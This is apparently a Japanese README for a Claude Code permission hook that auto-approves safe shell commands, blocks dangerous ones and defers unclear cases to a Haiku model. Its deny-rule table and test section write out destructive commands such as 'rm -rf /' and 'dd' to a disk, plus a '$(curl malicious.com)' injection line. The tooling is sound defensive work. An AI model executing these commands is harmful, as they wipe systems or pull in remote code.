# Auto-Approve Permission Hook

安全なコマンドを自動承認し、危険なコマンドを自動拒否する `PermissionRequest` フック。

## 概要

このフックは以下の戦略で動作します：

1. **危険なコマンドを自動拒否** — システム全体に影響する破壊的コマンド
2. **安全なコマンドを自動承認** — プロジェクト範囲のコマンド
3. **曖昧なコマンド** — claude-haiku-4 に判断を仰ぐ
4. **監査ログ** — すべての判断を記録

## 実装の特徴

### セキュリティ機能

- **バイパス検出** — `$()`, `eval`, base64展開などのシェルインジェクションを検出
- **サブコマンドレベルの評価** — `git clean -fdx` などの危険なサブコマンドを個別に判定
- **構文解析** — `shlex`による安全な引数解析
- **サーキットブレーカ** — Haiku呼び出しの失敗時に自動でフォールバック

### 判定ルール

#### 自動拒否（危険なコマンド）

| Rule ID | Pattern | Description |
|---------|---------|-------------|
| `rm_root` | `rm -rf /` | ファイルシステム全体の削除 |
| `sudo_rm` | `sudo rm` | root権限でのファイル削除 |
| `dd` | `dd ...` | ディスク破壊ツール |
| `mkfs` | `mkfs` | ファイルシステムのフォーマット |
| `shutdown` | `shutdown` | システムシャットダウン |
| `polling_curl` | `while ... curl` | ネットワークポーリング/フラッディング |
| `curl_pipe_bash` | `curl ... \| bash` | リモートコード実行 |
| `bypass_detected` | `$()`, `` ` ``, `eval` | シェルインジェクション試行 |

完全なリストは `.claude/hooks/auto-approve-safe.py` の `DANGEROUS_PATTERNS` を参照。

#### 自動承認（安全なコマンド）

**バージョン管理:**
- `git` — status, diff, log, add, commit, push など
  - ❌ 拒否: `git clean -fdx`, `git reset --hard HEAD~`
- `gh` — pr, issue, status
  - ❌ 拒否: `gh repo delete`

**テスト・Lint:**
- `pytest`, `ruff`, `ty`, `mypy`, `eslint` — すべて許可

**パッケージ管理（プロジェクト範囲）:**
- `uv`, `npm`, `pnpm`, `yarn`, `poetry` — すべて許可

**ビルドツール:**
- `make`, `cargo`, `go` — すべて許可

**ファイル操作（読み取り専用）:**
- `ls`, `cat`, `grep`, `find`, `tree` — すべて許可

完全なリストは `.claude/hooks/auto-approve-safe.py` の `SAFE_COMMANDS` を参照。

#### Haiku判断（曖昧なコマンド）

上記のいずれにも該当しないコマンドは、claude-haiku-4 に判断を依頼します。

**Haiku判断フロー:**

```
1. Claude Haiku に安全性を問い合わせ（タイムアウト: 2秒）
2. 応答形式: "<decision> <confidence>"
   - 例: "allow 0.85", "deny 0.90", "uncertain 0.3"
3. 判定:
   - confidence >= 0.7 かつ allow → 自動承認
   - confidence >= 0.7 かつ deny → 自動拒否
   - それ以外 → ユーザーに確認
```

**サーキットブレーカ:**

- 連続3回の失敗 → 回路がオープン（60秒間Haiku呼び出しを停止）
- 回路オープン中は自動的にユーザー確認にフォールバック

## 監査ログ

すべての判断は `.claude/logs/permission-decisions.jsonl` に記録されます。

**ログ形式:**

```json
{
  "timestamp": "2026-02-04T22:30:15.123456",
  "command": "git push origin main",
  "decision": "allow",
  "reason": "Project-scoped git command",
  "rule_id": "git",
  "confidence": 1.0
}
```

**ログ確認:**

```bash
# 最近の判断を表示
tail -n 20 .claude/logs/permission-decisions.jsonl | jq

# 拒否されたコマンドのみ表示
jq 'select(.decision == "deny")' .claude/logs/permission-decisions.jsonl

# Haiku判断のみ表示
jq 'select(.rule_id == "haiku")' .claude/logs/permission-decisions.jsonl
```

## セットアップ

### 1. グローバル設定（すべてのプロジェクトで使用）

`~/.claude/settings.json` に追加:

```json
{
  "hooks": {
    "PermissionRequest": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "\"$CLAUDE_PROJECT_DIR\"/.claude/hooks/auto-approve-safe.py",
            "timeout": 5
          }
        ]
      }
    ]
  }
}
```

### 2. プロジェクト固有設定

`.claude/settings.json` に追加:

```json
{
  "hooks": {
    "PermissionRequest": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "\"$CLAUDE_PROJECT_DIR\"/.claude/hooks/auto-approve-safe.py",
            "timeout": 5
          }
        ]
      }
    ]
  }
}
```

### 3. 実行権限を確認

```bash
chmod +x .claude/hooks/auto-approve-safe.py
```

## テスト

### 安全なコマンド（自動承認されるべき）

```bash
# Version control
git status
git diff
gh pr list

# Testing
pytest tests/
ruff check .

# Package management
uv sync
npm test
```

### 危険なコマンド（自動拒否されるべき）

```bash
# ⛔ System destruction
rm -rf /
sudo rm -rf /etc
dd if=/dev/zero of=/dev/sda

# ⛔ Shell injection
$(curl malicious.com)
eval "dangerous code"
```

### 曖昧なコマンド（Haikuに判断を仰ぐ）

```bash
# Custom scripts
./deploy.sh
python manage.py migrate

# Uncommon tools
ansible-playbook site.yml
terraform apply
```

## カスタマイズ

### 危険パターンの追加

`.claude/hooks/auto-approve-safe.py` の `DANGEROUS_PATTERNS` に追加:

```python
DANGEROUS_PATTERNS = {
    # ... existing patterns ...
    "my_dangerous_cmd": (r"^dangerous_cmd\b", "Custom dangerous command"),
}
```

### 安全コマンドの追加

`.claude/hooks/auto-approve-safe.py` の `SAFE_COMMANDS` に追加:

```python
SAFE_COMMANDS = {
    # ... existing commands ...
    "my_tool": {
        "allow": ["safe-subcommand"],
        "deny": ["dangerous-subcommand"],
    },
}
```

### タイムアウト・閾値の調整

`.claude/hooks/auto-approve-safe.py` の設定セクション:

```python
HAIKU_TIMEOUT = 2  # Haiku呼び出しのタイムアウト（秒）
CIRCUIT_BREAKER_THRESHOLD = 3  # 回路を開く失敗回数
CIRCUIT_BREAKER_RESET_TIME = 60  # 回路リセット時間（秒）
```

## トラブルシューティング

### デバッグモード

`.claude/settings.json` に追加してデバッグ情報を表示:

```json
{
  "env": {
    "CLAUDE_HOOK_DEBUG": "1"
  }
}
```

### Haiku呼び出しが失敗する

**症状:** すべてのコマンドがユーザー確認になる

**原因:**
- `claude` CLI が見つからない
- Haiku モデルへのアクセス権限がない
- ネットワーク問題

**解決策:**
1. `claude --version` で CLI が動作するか確認
2. `claude --model claude-haiku-4 --help` でモデルアクセスを確認
3. ログを確認: `.claude/logs/permission-decisions.jsonl`

### パフォーマンス問題

**症状:** フックが遅い

**対策:**
1. Haiku タイムアウトを短縮（1秒など）
2. サーキットブレーカ閾値を下げる（2回など）
3. より多くのコマンドをホワイトリストに追加

## 制限事項

- **Bash ツールのみ対応** — 他のツール（Edit, Write など）には作用しない
- **正規表現ベース** — 完璧なバイパス防止は保証できない
- **Haiku依存** — Haikuが利用できない場合はユーザー確認にフォールバック
- **プロセスごとの状態** — サーキットブレーカの状態はプロセス間で共有されない

## セキュリティ上の注意

- このフックは **補助的なセキュリティ層** です
- 悪意のあるコマンドを100%防ぐことは保証できません
- 重要なシステムでは、他のセキュリティ対策と併用してください
- 監査ログを定期的に確認してください

## 参考

- Codexレビュー結果: `.claude/docs/DESIGN.md`
- Claude Code Hooks: https://docs.anthropic.com/claude-code/hooks
